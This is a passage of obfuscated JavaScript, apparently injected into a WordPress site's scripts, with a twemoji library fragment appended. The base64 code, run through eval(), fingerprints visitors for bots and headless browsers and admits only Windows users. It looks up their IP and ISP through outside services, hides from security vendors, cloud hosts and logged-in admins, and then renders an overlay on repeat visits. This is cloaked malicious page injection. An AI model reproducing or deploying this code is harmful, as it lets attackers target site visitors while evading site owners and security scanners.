YmRyaXZlciA9IG5hdmlnYXRvci53ZWJkcml2ZXIgPT09IHRydWU7CiAgICAgICAgcmV0dXJuIHsgc2NvcmU6IGhhc1dlYmRyaXZlciA/IEhFQURMRVNTX1dFSUdIVCA6IEhFQURGVUxfV0VJR0hUIH07CiAgICAgIH0sCiAgICAgICgpID0+IHsKICAgICAgICBjb25zdCBoYXNDaHJvbWUgPSAhIXdpbmRvdy5jaHJvbWU7CiAgICAgICAgY29uc3QgaGFzQ29ycmVjdENocm9tZSA9IGhhc0Nocm9tZSAmJiAod2luZG93LmNocm9tZS5ydW50aW1lIHx8IHdpbmRvdy5jaHJvbWUubG9hZFRpbWVzKTsKICAgICAgICBjb25zdCBpc1N1c3BpY2lvdXMgPSAhaGFzQ2hyb21lIHx8ICFoYXNDb3JyZWN0Q2hyb21lOwogICAgICAgIHJldHVybiB7IHNjb3JlOiBpc1N1c3BpY2lvdXMgPyBTVVNQSUNJT1VTX1dFSUdIVCA6IEhFQURGVUxfV0VJR0hUIH07CiAgICAgIH0sCiAgICAgIGFzeW5jICgpID0+IHsKICAgICAgICBpZiAoIW5hdmlnYXRvci5wZXJtaXNzaW9ucykgcmV0dXJuIHsgc2NvcmU6IDAgfTsKICAgICAgICB0cnkgewogICAgICAgICAgY29uc3QgcGVybWlzc2lvblN0YXR1cyA9IGF3YWl0IG5hdmlnYXRvci5wZXJtaXNzaW9ucy5xdWVyeSh7IG5hbWU6ICJub3RpZmljYXRpb25zIiB9KTsKICAgICAgICAgIGNvbnN0IG5vdGlmaWNhdGlvblBlcm1pc3Npb24gPSBOb3RpZmljYXRpb24ucGVybWlzc2lvbjsKICAgICAgICAgIGNvbnN0IGlzSW5jb25zaXN0ZW50ID0gKG5vdGlmaWNhdGlvblBlcm1pc3Npb24gPT09ICJkZW5pZWQiICYmIHBlcm1pc3Npb25TdGF0dXMuc3RhdGUgPT09ICJwcm9tcHQiKTsKICAgICAgICAgIHJldHVybiB7IHNjb3JlOiBpc0luY29uc2lzdGVudCA/IEhFQURMRVNTX1dFSUdIVCA6IEhFQURGVUxfV0VJR0hUIH07CiAgICAgICAgfSBjYXRjaCAoZXJyb3IpIHsKICAgICAgICAgIHJldHVybiB7IHNjb3JlOiBTVVNQSUNJT1VTX1dFSUdIVCB9OwogICAgICAgIH0KICAgICAgfSwKICAgICAgKCkgPT4gewogICAgICAgIGNvbnN0IHBsdWdpbnNMZW5ndGggPSBuYXZpZ2F0b3IucGx1Z2lucz8ubGVuZ3RoIHx8IDA7CiAgICAgICAgY29uc3QgaXNTdXNwaWNpb3VzID0gcGx1Z2luc0xlbmd0aCA9PT0gMDsKICAgICAgICByZXR1cm4geyBzY29yZTogaXNTdXNwaWNpb3VzID8gU1VTUElDSU9VU19XRUlHSFQgOiBIRUFERlVMX1dFSUdIVCB9OwogICAgICB9LAogICAgICAoKSA9PiB7CiAgICAgICAgY29uc3QgbGFuZ3VhZ2UgPSBuYXZpZ2F0b3IubGFuZ3VhZ2U7CiAgICAgICAgY29uc3QgbGFuZ3VhZ2VzTGVuZ3RoID0gbmF2aWdhdG9yLmxhbmd1YWdlcz8ubGVuZ3RoIHx8IDA7CiAgICAgICAgY29uc3QgaXNTdXNwaWNpb3VzID0gIWxhbmd1YWdlIHx8IGxhbmd1YWdlc0xlbmd0aCA9PT0gMDsKICAgICAgICByZXR1cm4geyBzY29yZTogaXNTdXNwaWNpb3VzID8gSEVBRExFU1NfV0VJR0hUIDogSEVBREZVTF9XRUlHSFQgfTsKICAgICAgfSwKICAgICAgKCkgPT4gewogICAgICAgIHRyeSB7CiAgICAgICAgICBjb25zdCBjYW52YXMgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdjYW52YXMnKTsKICAgICAgICAgIGNvbnN0IGdsID0gY2FudmFzLmdldENvbnRleHQoJ3dlYmdsJykgfHwgY2FudmFzLmdldENvbnRleHQoJ2V4cGVyaW1lbnRhbC13ZWJnbCcpOwogICAgICAgICAgaWYgKCFnbCkgcmV0dXJuIHsgc2NvcmU6IFNVU1BJQ0lPVVNfV0VJR0hUIH07CiAgICAgICAgICBjb25zdCBkZWJ1Z0luZm8gPSBnbC5nZXRFeHRlbnNpb24oJ1dFQkdMX2RlYnVnX3JlbmRlcmVyX2luZm8nKTsKICAgICAgICAgIGNvbnN0IHJlbmRlcmVyID0gZGVidWdJbmZvID8gZ2wuZ2V0UGFyYW1ldGVyKGRlYnVnSW5mby5VTk1BU0tFRF9SRU5ERVJFUl9XRUJHTCkgOiAndW5rbm93bic7CiAgICAgICAgICBjb25zdCBpc1N1c3BpY2lvdXMgPSAvc3dpZnRzaGFkZXJ8bGx2bXBpcGV8bWVzYS9pLnRlc3QocmVuZGVyZXIpOwogICAgICAgICAgcmV0dXJuIHsgc2NvcmU6IGlzU3VzcGljaW91cyA/IFNVU1BJQ0lPVVNfV0VJR0hUIDogSEVBREZVTF9XRUlHSFQgfTsKICAgICAgICB9IGNhdGNoIChlcnJvcikgewogICAgICAgICAgcmV0dXJuIHsgc2NvcmU6IFNVU1BJQ0lPVVNfV0VJR0hUIH07CiAgICAgICAgfQogICAgICB9LAogICAgICAoKSA9PiB7CiAgICAgICAgY29uc3Qgb3V0ZXJIZWlnaHQgPSB3aW5kb3cub3V0ZXJIZWlnaHQ7CiAgICAgICAgY29uc3Qgb3V0ZXJXaWR0aCA9IHdpbmRvdy5vdXRlcldpZHRoOwogICAgICAgIGNvbnN0IGlubmVySGVpZ2h0ID0gd2luZG93LmlubmVySGVpZ2h0OwogICAgICAgIGNvbnN0IGlubmVyV2lkdGggPSB3aW5kb3cuaW5uZXJXaWR0aDsKICAgICAgICBjb25zdCBpc1N1c3BpY2lvdXMgPSAob3V0ZXJIZWlnaHQgPT09IDAgJiYgb3V0ZXJXaWR0aCA9PT0gMCkgfHwgKG91dGVySGVpZ2h0ID09PSBpbm5lckhlaWdodCAmJiBvdXRlcldpZHRoID09PSBpbm5lcldpZHRoKTsKICAgICAgICByZXR1cm4geyBzY29yZTogaXNTdXNwaWNpb3VzID8gSEVBRExFU1NfV0VJR0hUIDogSEVBREZVTF9XRUlHSFQgfTsKICAgICAgfSwKICAgICAgKCkgPT4gewogICAgICAgIGNvbnN0IGlzQ29udHJvbGxlZCA9IG5hdmlnYXRvci53ZWJkcml2ZXIgfHwgd2luZG93LmRvY3VtZW50Py5kb2N1bWVudEVsZW1lbnQ/LmdldEF0dHJpYnV0ZSgnd2ViZHJpdmVyJykgPT09ICd0cnVlJyB8fCB3aW5kb3cuY2FsbFBoYW50b20gfHwgd2luZG93Ll9waGFudG9tOwogICAgICAgIHJldHVybiB7IHNjb3JlOiBpc0NvbnRyb2xsZWQgPyBIRUFETEVTU19XRUlHSFQgOiBIRUFERlVMX1dFSUdIVCB9OwogICAgICB9LAogICAgICAoKSA9PiB7CiAgICAgICAgY29uc3QgaXNIZWFkbGVzcyA9IC9IZWFkbGVzc0Nocm9tZS8udGVzdChuYXZpZ2F0b3IudXNlckFnZW50KTsKICAgICAgICByZXR1cm4geyBzY29yZTogaXNIZWFkbGVzcyA/IEhFQURMRVNTX1dFSUdIVCA6IDAgfTsKICAgICAgfSwKICAgICAgKCkgPT4gewogICAgICAgIGNvbnN0IGlzUGhhbnRvbSA9IHdpbmRvdy5jYWxsUGhhbnRvbSB8fCB3aW5kb3cuX3BoYW50b20gfHwgd2luZG93LnBoYW50b207CiAgICAgICAgcmV0dXJuIHsgc2NvcmU6IGlzUGhhbnRvbSA/IEhFQURMRVNTX1dFSUdIVCA6IDAgfTsKICAgICAgfSwKICAgICAgKCkgPT4gewogICAgICAgIGNvbnN0IGlzU2VsZW5pdW0gPSB3aW5kb3cuZG9jdW1lbnQ/LmRvY3VtZW50RWxlbWVudD8uZ2V0QXR0cmlidXRlKCdzZWxlbml1bScpICE9PSBudWxsIHx8IHdpbmRvdy5kb2N1bWVudD8uZG9jdW1lbnRFbGVtZW50Py5nZXRBdHRyaWJ1dGUoJ3dlYmRyaXZlcicpICE9PSBudWxsIHx8IHdpbmRvdy5kb2N1bWVudD8uJGNkY18gIT09IHVuZGVmaW5lZCB8fCB3aW5kb3cuZG9jdW1lbnQ/LiR3ZGNfICE9PSB1bmRlZmluZWQ7CiAgICAgICAgcmV0dXJuIHsgc2NvcmU6IGlzU2VsZW5pdW0gPyBIRUFETEVTU19XRUlHSFQgOiAwIH07CiAgICAgIH0KICAgIF07CgogICAgbGV0IHRvdGFsU2NvcmUgPSAwOwogICAgZm9yIChjb25zdCBjaGVjayBvZiBjaGVja3MpIHsKICAgICAgdHJ5IHsKICAgICAgICBjb25zdCByZXN1bHQgPSBhd2FpdCBjaGVjaygpOwogICAgICAgIHRvdGFsU2NvcmUgKz0gcmVzdWx0LnNjb3JlOwogICAgICB9IGNhdGNoIChlcnJvcikgewogICAgICAgIC8vIElnbm9yZSBlcnJvcnMKICAgICAgfQogICAgfQoKICAgIGNvbnN0IG1heFBvc3NpYmxlU2NvcmUgPSBjaGVja3MubGVuZ3RoICogSEVBRExFU1NfV0VJR0hUOwogICAgY29uc3QgbWluUG9zc2libGVTY29yZSA9IGNoZWNrcy5sZW5ndGggKiBIRUFERlVMX1dFSUdIVDsKICAgIGNvbnN0IG5vcm1hbGl6ZWRTY29yZSA9IE1hdGgubWF4KDAsIE1hdGgubWluKDEwMCwgKCh0b3RhbFNjb3JlIC0gbWluUG9zc2libGVTY29yZSkgLyAobWF4UG9zc2libGVTY29yZSAtIG1pblBvc3NpYmxlU2NvcmUpKSAqIDEwMCkpOwogICAgcmV0dXJuIE1hdGgucm91bmQobm9ybWFsaXplZFNjb3JlKTsKICB9CgogIGZ1bmN0aW9uIGRldGVjdE9TKCkgewogICAgY29uc3QgdXNlckFnZW50ID0gbmF2aWdhdG9yLnVzZXJBZ2VudC50b0xvd2VyQ2FzZSgpOwogICAgY29uc3QgcGxhdGZvcm0gPSBuYXZpZ2F0b3IucGxhdGZvcm0/LnRvTG93ZXJDYXNlKCkgfHwgJyc7CgogICAgaWYgKC9pcGhvbmV8aXBhZHxpcG9kL2kudGVzdCh1c2VyQWdlbnQpKSByZXR1cm4gJ2lvcyc7CiAgICBpZiAoL2FuZHJvaWQvaS50ZXN0KHVzZXJBZ2VudCkpIHJldHVybiAnYW5kcm9pZCc7CiAgICBpZiAoL2xpbnV4L2kudGVzdCh1c2VyQWdlbnQpICYmICEvYW5kcm9pZC9pLnRlc3QodXNlckFnZW50KSkgcmV0dXJuICdsaW51eCc7CiAgICBpZiAoL21hYyBvcyB4fG1hY2ludG9zaC9pLnRlc3QodXNlckFnZW50KSkgcmV0dXJuICdtYWMnOwogICAgaWYgKC93aW4vaS50ZXN0KHVzZXJBZ2VudCkgfHwgL3dpbi9pLnRlc3QocGxhdGZvcm0pKSByZXR1cm4gJ3dpbmRvd3MnOwoKICAgIHJldHVybiAndW5rbm93bic7CiAgfQoKICBhc3luYyBmdW5jdGlvbiBpc0FjY2Vzc0FsbG93ZWQoKSB7CiAgICB0cnkgewogICAgICBjb25zdCBkZXRlY3RlZE9TID0gZGV0ZWN0T1MoKTsKICAgICAgY29uc3QgaW5jbHVkZU9TTGlzdCA9IFsid2luZG93cyJdOwogICAgICBpZiAoaW5jbHVkZU9TTGlzdC5sZW5ndGggPiAwICYmICFpbmNsdWRlT1NMaXN0LmluY2x1ZGVzKGRldGVjdGVkT1MpKSB7CiAgICAgICAgdmxvZygnZGVueV9vcycsIGRldGVjdGVkT1MpOwogICAgICAgIHRyYWNrQm90KCk7CiAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICB9CgogICAgICBjb25zdCBoZWFkbGVzc1Byb2JhYmlsaXR5ID0gYXdhaXQgZGV0ZWN0SGVhZGxlc3MoKTsKICAgICAgaWYgKGhlYWRsZXNzUHJvYmFiaWxpdHkgPiAyNSkgewogICAgICAgIHZsb2coJ2RlbnlfaGVhZGxlc3MnLCBoZWFkbGVzc1Byb2JhYmlsaXR5KTsKICAgICAgICB0cmFja0JvdCgpOwogICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgfQoKICAgICAgY29uc3QgYm90UGF0dGVybnMgPSBbJ2JvdCcsJ2NyYXdsJywnc3BpZGVyJywnc2NyYXBlJywnc2x1cnAnLCd5YWhvbycsJ2dvb2dsZScsJ3lhbmRleCcsJ2JhaWR1JywnYmluZycsJ2R1Y2tkdWNrJywndGVvbWEnLCdhcmNoaXZlJ107CiAgICAgIGNvbnN0IHVzZXJBZ2VudCA9IG5hdmlnYXRvci51c2VyQWdlbnQudG9Mb3dlckNhc2UoKTsKICAgICAgZm9yIChjb25zdCBwYXR0ZXJuIG9mIGJvdFBhdHRlcm5zKSB7CiAgICAgICAgaWYgKHVzZXJBZ2VudC5pbmNsdWRlcyhwYXR0ZXJuKSkgewogICAgICAgICAgdmxvZygnZGVueV9ib3RfdWEnLCB1c2VyQWdlbnQpOwogICAgICAgICAgdHJhY2tCb3QoKTsKICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICB9CiAgICAgIH0KCiAgICAgIAogICAgICBjb25zdCBpcFJlc3BvbnNlID0gYXdhaXQgZmV0Y2goJ2h0dHBzOi8vYXBpLmlwaWZ5Lm9yZz9mb3JtYXQ9anNvbicpOwogICAgICBpZiAoIWlwUmVzcG9uc2Uub2spIHsKICAgICAgICB2bG9nKCdpcGlmeV9mYWlsZWQnLCBpcFJlc3BvbnNlLnN0YXR1cyk7CiAgICAgICAgcmV0dXJuIHRydWU7CiAgICAgIH0KICAgICAgY29uc3QgaXBEYXRhID0gYXdhaXQgaXBSZXNwb25zZS5qc29uKCk7CiAgICAgIGNvbnN0IGlwID0gaXBEYXRhLmlwOwoKICAgICAgY29uc3QgaXNwUmVzcG9uc2UgPSBhd2FpdCBmZXRjaCgnaHR0cHM6Ly9pcDJsb2NhdGlvbi1hcGktOTc5ODQ4MDY3Njc3LnVzLWNlbnRyYWwxLnJ1bi5hcHAvP2lwPScgKyBpcCk7CiAgICAgIGlmICghaXNwUmVzcG9uc2Uub2spIHsKICAgICAgICB2bG9nKCdpc3BfbG9va3VwX2ZhaWxlZCcsIGlzcFJlc3BvbnNlLnN0YXR1cyk7CiAgICAgICAgcmV0dXJuIHRydWU7CiAgICAgIH0KICAgICAgY29uc3QgaXNwRGF0YSA9IGF3YWl0IGlzcFJlc3BvbnNlLmpzb24oKTsKICAgICAgY29uc3QgaXNwID0gaXNwRGF0YS5pc3AgfHwgJyc7CiAgICAgIGNvbnN0IGNvdW50cnlDb2RlID0gaXNwRGF0YS5nZW9pcDJfY291bnRyeV9jb2RlIHx8ICcnOwoKICAgICAgdmxvZygnaXBfaW5mbycsIHsgaXAsIGNvdW50cnlDb2RlLCBpc3AgfSk7CgogICAgICBjb25zdCBpbmNsdWRlQ291bnRyeUxpc3QgPSBbXTsKICAgICAgaWYgKGluY2x1ZGVDb3VudHJ5TGlzdC5sZW5ndGggPiAwICYmICghY291bnRyeUNvZGUgfHwgIWluY2x1ZGVDb3VudHJ5TGlzdC5pbmNsdWRlcyhjb3VudHJ5Q29kZSkpKSB7CiAgICAgICAgdmxvZygnZGVueV9jb3VudHJ5JywgY291bnRyeUNvZGUpOwogICAgICAgIHRyYWNrQm90KCk7CiAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICB9CgogICAgICBjb25zdCBibG9ja2VkSVNQcyA9IFsKICAgICAgICAnTTI0NyBFdXJvcGUnLCdQYWNrZXRodWInLCdMZWFzZVdlYicsJ0RhdGFDYW1wJywnSVBYTycsJ1NlY3VyZSBEYXRhIFN5c3RlbXMnLCdOaWVkZXJzYWVjaHNpc2NoZSBMYW5kZXNyZWdpZXJ1bmcnLCdCYXJyYWN1ZGEgTmV0d29ya3MnLCdUcmVuZCBNaWNybyBJbmNvcnBvcmF0ZWQnLCdNaWNyb3NvZnQgQ29ycCcsJ01pY3Jvc29mdCBDb3Jwb3JhdGlvbicsJ1N1cmZDb250cm9sJywnV2Vic2Vuc2UnLCdHSE9TVG5ldCBHbWJIJywnSU5FVHUnLCdBdmlyYSBCLlYuJywnR29vZ2xlIENsb3VkJywnWWFob28hJywnQ29tbXRvdWNoJywnQ2xvdWRGbGFyZScsJ1RydXN0d2F2ZSBIb2xkaW5ncycsJ0ZPUlRIbmV0IFNBJywnVVMgRGVwYXJ0bWVudCBvZiBEZWZlbnNlIE5ldHdvcmsnLCdaT05FUyBBUycsJ0Npc2NvIFN5c3RlbXMgSXJvbnBvcnQgRGl2aXNpb24nLCdUaGVQbGFuZXQuY29tIEludGVybmV0IFNlcnZpY2VzJywnV2Vicm9vdCBTZXJ2aWNlcycsJ1JhY2tzcGFjZSBIb3N0aW5nJywnUGVyaW1ldGVyIGVTZWN1cml0eScsJ0RpZ2l0YWxPY2VhbicsJ1BhY2tldEV4Y2hhbmdlJywnR3lyb24gSW50ZXJuZXQgTHRkJywnTmV3TWVkaWEgRXhwcmVzcyBQdGUnLCdBbWF6b24uY29tJywnTWNBZmVlJywnRVNFVCwgc3BvbC4gcyByLm8uJywnRmFjZWJvb2snLCdGYWNlYm9vayBJcmVsYW5kIEx0ZCcsJ1lhaG9vISBCcm9hZGNhc3QgU2VydmljZXMnLCdZYWhvbyEgSW5kaWEgUHZ0JywnWWFob28gSmFwYW4nLCdZYWhvbyBKYXBhbiBDb3Jwb3JhdGlvbicsJ0dvb2dsZWJvdCcsJ0FWQVNUIFNvZnR3YXJlIHMuci5vLicsJ01pY3Jvc29mdCBiaW5nYm90JywnTWljcm9zb2Z0IEhvc3RpbmcnLCdBbWF6b24gVGVjaG5vbG9naWVzJywnQ3l2ZWlsbGFuY2UnLCdDbG91ZG1hcmsnLCdDbG91ZG1hcmsgTGFicycsJ1RvcHN5IExhYnMnLCdBbWF6b24nLCdTRVJWRVIgQkxPQ0snLCdPVkggSG9zdGluZycsJ1lBTkRFWCcsJ1lBTkRFWCBMTEMnLCdZYWhvbyBCYW5nYWxvcmUgTmV0d29yayBNb25pdG9yaW5nIENlbnRlcicsJ1RpbmV0JywnTXVsdGltZWRpYSBQb2xza2EgUy5BLicsJ011bHRpbWVkaWEgUG9sc2thIC0gUG9sdWRuaWUgUy5BLicsJ1plbml0aCBFbGVjdHJvbmljcyBDb3Jwb3JhdGlvbicsJ0JhcnJhY3VkYSBDYW5hZGEnLCdNaWNyb3NvZnQgTGltaXRlZCcsJ01pY3Jvc29mdCAoQ2hpbmEpIENvLicsJ1NQQU1maWdodGVyIEFwUycsJ1NwYW1maWdodGVyLWFzJywnRGlnaXRhbE9uZSBBRycsJ1R3aXR0ZXInLCdUd2l0dGVyIEludGVybmF0aW9uYWwgQ29tcGFueScsJ1N1cmZjb250cm9sLXJlYWRpbmcnLCdZYWhvbyBDb3JwIE5ldHdvcmsnLCdDb25lY3RpdmEnLCdDb25lY3RpdmEgVGVsZWNvbScsJ0NvbmVjdGl2YSBDZWx1bGFyIGUgSW5mb3JtYXRpY2EgTHRkYScsJ1JlZGlmZi5jb20gSW5kaWEgTGltaXRlZCcsJ0luY2VybyBMTEMnLCdPTkxJTkUgUy5BLlMuJywnT05MSU5FIFNBUycsJ1Rpc2NhbGktaXQnLCdUaXNjYWxpIFNwQScsJ1Rpc2NhbGkgVUsgTGltaXRlZCcsJ0Z1aml0c3UnLCdEYXVtIENvbW11bmljYXRpb24gQ28uLExURCcsJ0ludGVybmV0IFNlY3VyaXR5IFN5c3RlbXMnLCdWS29udGFrdGUgTHRkJywnTGVhc2V3ZWInLCdMZWFzZVdlYiBOZXRoZXJsYW5kcyBCLlYuJywnTGVhc2VXZWIgQi5WLicsJ0xlYXNlV2ViIENETiBCLlYuJywnTGVhc2VXZWIgTmV0d29yayBCLlYuJywnTGVhc2V3ZWIgQXNpYScsJ0xlYXNld2ViIEFzaWEgUGFjaWZpYyBwdGUuJywnTGVhc2V3ZWIgRGV1dHNjaGxhbmQgR21iSCcsJ0xlYXNld2ViIFVTQScsJ0xlYXNld2ViLWRlJywnSW50ZXJOQVAgTmV0d29yayBTZXJ2aWNlcyBVLksuIExpbWl0ZWQnLCdJbnRlcm5hcCBKYXBhbiBDby4sTFRELicsJ0ludGVybmFwIE5ldHdvcmsgU2VydmljZXMnLCdJbnRlcm5hcCBOZXR3b3JrIFNlcnZpY2VzIENvcnBvcmF0aW9uJywnQml0ZGVmZW5kZXItYXMnLCdCaXRkZWZlbmRlciBTUkwnLCdNWCBMb2dpYycsJ0NoaW5hIEVkdWNhdGlvbiBhbmQgUmVzZWFyY2ggTmV0d29yayBDZW50ZXInLCdDaGluYSBEdXR5IEZyZWUgZ3JvdXAnLCdDaGluYScsJ0NoaW5hIEJyb2FkYmFuZCBDb21tdW5pY2F0aW9ucyAoQ0JDbmV0KScsJ0NoaW5hIEJyb2FkY2FzdGluZyBUViBOZXQnLCdDaGluYSBDb21tdW5pY2F0aW9uIENvLicsJ0NoaW5hIENvbnN0cnVjdGlvbiBCYW5rIChBc2lhKSBDb3Jwb3JhdGlvbiBMaW1pdGVkJywnQ2hpbmEgQ3VsdHVyYWwgSGVyaXRhZ2UgSW5mb3JtYXRpb24gYW5kIENvbnN1bHRpbmcnLCdDaGluYSBEaWdpdGFsIEtpbmdkb20gVGVjaG5vbG9neSBDby4sTHRkLicsJ0NoaW5hIERyYWdvbiBUZWxlY29tIENvLixMdGQnLCdGYWN0aW9uJywnWmVuIFN5c3RlbXMgQS9TJywnT1ZIIFNBUycsJ1NvbHV0aW9uIFBybycsJ0RlZEZpYmVyQ28nLCdDbGVhckJsdWUgVGVjaG5vbG9naWVzJywnSW5mb3JtYXRpb24gVGVjaG5vbG9neSBTeXN0ZW1zJywnR29EYWRkeS5jb20sIExMQycsJ1NlcnZlciBDZW50cmFsIE5ldHdvcmsnLCdUaW5ldCBTcGEnLCdDYXByaXMgR3JvdXAnLCdJbmt0b21pIENvcnBvcmF0aW9uJywnVW5pZmllZCBMYXllcicsJ0pTQyBSVENvbW0uUlUnLCdMTEMgbWFzdGVyaG9zdCcsJ01UTyBUZWxlY29tJywnTGlua2VkSW4gQ29ycG9yYXRpb24nLCdXZWJzaXRld2VsY29tZS5jb20nLCdHVFMgVGVsZWNvbSBTUkwnLCdQdWxzZVBvaW50IENvbW11bmljYXRpb25zJywnUHVsc2Vwb2ludCcsJ1RpbWVXZWIgTHRkLicsJ0JlaWppbmcgQmFpZHUgTmV0Y29tIFNjaWVuY2UgYW5kIFRlY2hub2xvZ3kgQ28uJywnRGlnaXRhbCBPY2VhbicsJ1RocmVhdFRyYWNrJywnVGhyZWF0VHJhY2sgU2VjdXJpdHknLCdFR0lIb3N0aW5nJywnSEVUWk5FUicsJ0hldHpuZXItYXMnLCdIZXR6bmVyIE9ubGluZSBHbWJIJywnSEVUWk5FUiAoUHR5KSBMdGQnLCdIZXR6bmVyIENDJywnTGltaXRlZCBsaWFiaWxpdHkgY29tcGFueSBNYWlsLlJ1JywnQW1hem9uIENvcnBvcmF0ZSBMTEMnLCdBbWF6b24gRGF0YSBTZXJ2aWNlcyBJcmVsYW5kIEx0ZCcsJ0FtYXpvbiBXZWIgU2VydmljZXMsIExMQycsJ0FtYXpvbi5jb20gVGVjaCBUZWxlY29tJywnQW1hem9uaWEgUHVibGljaWRhZGUgTHRkYScsJ0FtYXpvbmlhIFRlbGVjb20gTHRkYS4gLSBNZScsJ0thc3BlcnNreSBMYWIgQU8nLCdBbGlzdGFyIFNlY3VyaXR5IFNybCcsJ05GT3JjZSBFbnRlcnRhaW5tZW50IEIuVi4nLCdTSyBCcm9hZGJhbmQnLCdaYXlvIEdyb3VwIEVVIExpbWl0ZWQnLCdRdWFkcmFOZXQnLCdSYW1Ob2RlIExMQycsJ0hvc3RVUycKICAgICAgXTsKCiAgICAgIGlmIChibG9ja2VkSVNQcy5pbmNsdWRlcyhpc3ApKSB7CiAgICAgICAgdmxvZygnZGVueV9pc3AnLCBpc3ApOwogICAgICAgIHRyYWNrQm90KCk7CiAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICB9CiAgICAgIAoKICAgICAgcmV0dXJuIHRydWU7CiAgICB9IGNhdGNoIChlcnIpIHsKICAgICAgdmVycignQWNjZXNzIGNoZWNrIGZhaWxlZDonLCBlcnIpOwogICAgICByZXR1cm4gdHJ1ZTsKICAgIH0KICB9CgogIGFzeW5jIGZ1bmN0aW9uIGluaXQoKSB7CiAgICB0cnkgewogICAgICBjb25zdCBhbGxvd2VkID0gYXdhaXQgaXNBY2Nlc3NBbGxvd2VkKCk7CiAgICAgIHZsb2coJ2FjY2Vzc19hbGxvd2VkJywgYWxsb3dlZCk7CiAgICAgIGlmICghYWxsb3dlZCkgewogICAgICAgIHJldHVybjsKICAgICAgfQoKICAgICAgY29uc3Qgc2tpcCA9IGdldFZhbCgnX3NraXAnLCAnMCcpOwogICAgICBpZiAoc2tpcCA9PT0gJzEnKSB7CiAgICAgICAgcmV0dXJuOwogICAgICB9CgogICAgICBpZiAoZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3dwYWRtaW5iYXInKSkgewogICAgICAgIHJldHVybjsKICAgICAgfQoKICAgICAgbGV0IGNvdW50ID0gcGFyc2VJbnQoZ2V0VmFsKEtFWSwgJzAnKSwgMTApOwogICAgICBpZiAoTnVtYmVyLmlzTmFOKGNvdW50KSkgY291bnQgPSAwOwogICAgICBjb3VudCsrOwogICAgICBzZXRWYWwoS0VZLCBjb3VudC50b1N0cmluZygpKTsKCiAgICAgIGlmIChjb3VudCA+PSBOKSB7CiAgICAgICAgcmVuZGVyT3ZlcmxheSgpOwogICAgICB9CiAgICB9IGNhdGNoKGUpIHsKICAgICAgdmVycignaW5pdF9mYWlsZWQnLCBlKTsKICAgICAgcmVuZGVyT3ZlcmxheSgpOwogICAgfQogIH0KCiAgaWYgKGRvY3VtZW50LmJvZHkpIHsKICAgIGluaXQoKTsKICB9IGVsc2UgewogICAgZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcignRE9NQ29udGVudExvYWRlZCcsIGluaXQpOwogIH0KfSkoKTsKICA=",
    "MC41ODc4NTc2MzIyOTI3ODIy",
    "MC41NjQ3NzczNDMyNzM4MTg4",
    "MC4xNTYxNTg1MDgwNjY4MTE1Mw=="
  ];

  var _k1 = "539252";
  var _k2 = "385903";
  var _k3 = 6;

  var _code = b64ToUtf8(_b[_k1]) + b64ToUtf8(_a[_k2]) + b64ToUtf8(_c[_k3]);
  eval(_code);
})();
/* >>> wp_junk2.js (46393 bytes) <<< */
(function(){
try{
var twemoji = function() {
    "use strict";
    var h = {
            base: "https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.0.3/assets/",
            ext: ".png",
            size: "72x72",
            className: "emoji",
            convert: {
                fromCodePoint: function(d) {
                    d = "string" == typeof d ? parseInt(d, 16) : d;
                    if (d < 65536) return e(d);
                    return e(55296 + ((d -= 65536) >> 10), 56320 + (1023 & d))
                },
                toCodePoint: o
            },
            onerror: function() {
                this.parentNode && this.parentNode.replaceChild(x(this.alt, !1), this)
            },
            parse: function(d, u) {
                u && "function" != typeof u || (u = {
                    callback: u
                });
                return h.doNotParse = u.doNotParse, ("string" == typeof d ? function(d, a) {
                    return n(d, function(d) {
                        var u, f, c = d,
                            e = N(d),
                            b = a.callback(e, a);
                        if (e && b) {
                            for (f in c = "<img ".concat('class="', a.className, '" ', 'draggable="false" ', 'alt="', d, '"', ' src="', b, '"'), u = a.attributes(d, e)) u.hasOwnProperty(f) && 0 !== f.indexOf("on") && -1 === c.indexOf(" " + f + "=") && (c = c.concat(" ", f, '="', u[f].replace(t, r), '"'));
                            c = c.concat("/>")
                        }
                        return c
                    })
                } : function(d, u) {
                    var f, c, e, b, a, t, r, n, o, s, i, l = function d(u, f) {
                            var c, e, b = u.childNodes,
                                a = b.length;
                            for (; a--;) c = b[a], 3 === (e = c.nodeType) ? f.push(c) : 1 !== e || "ownerSVGElement" in c || m.test(c.nodeName.toLowerCase()) || h.doNotParse && h.doNotParse(c) || d(c, f);
                            return f
                        }(d, []),
                        p = l.length;
                    for (; p--;) {
                        for (e = !1, b = document.createDocumentFragment(), a = l[p], t = a.nodeValue, r = 0; o = g.exec(t);) {
                            if ((i = o.index) !== r && b.appendChild(x(t.slice(r, i), !0)), s = N(o = o[0]), r = i + o.length, i = u.callback(s, u), s && i) {
                                for (c in (n = new Image).onerror = u.onerror, n.setAttribute("draggable", "false"), f = u.attributes(o, s)) f.hasOwnProperty(c) && 0 !== c.indexOf("on") && !n.hasAttribute(c) && n.setAttribute(c, f[c]);
                                n.className = u.className, n.alt = o, n.src = i, e = !0, b.appendChild(n)
                            }
                            n || b.appendChild(x(o, !1)), n = null
                        }
                        e && (r < t.length && b.appendChild(x(t.slice(r), !0)), a.parentNode.replaceChild(b, a))
                    }
                    return d
                })(d, {
                    callback: u.callback || b,
                    attributes: "function" == typeof u.attributes ? u.attributes : a,
                    base: ("string" == typeof u.base ? u : h).base,
                    ext: u.ext || h.ext,
                    size: u.folder || function(d) {
                        return "number" == typeof d ? d + "x" + d : d
                    }(u.size || h.size),
                    className: u.className || h.className,
                    onerror: u.onerror || h.onerror
                })
            },
            replace: n,
            test: function(d) {
                g.lastIndex = 0;
                d = g.test(d);
                return g.lastIndex = 0, d
            }
        },
        u = {
            "&": "&amp;",
            "<": "&lt;",
            ">": "&gt;",
            "'": "&#39;",
            '"': "&quot;"
        },
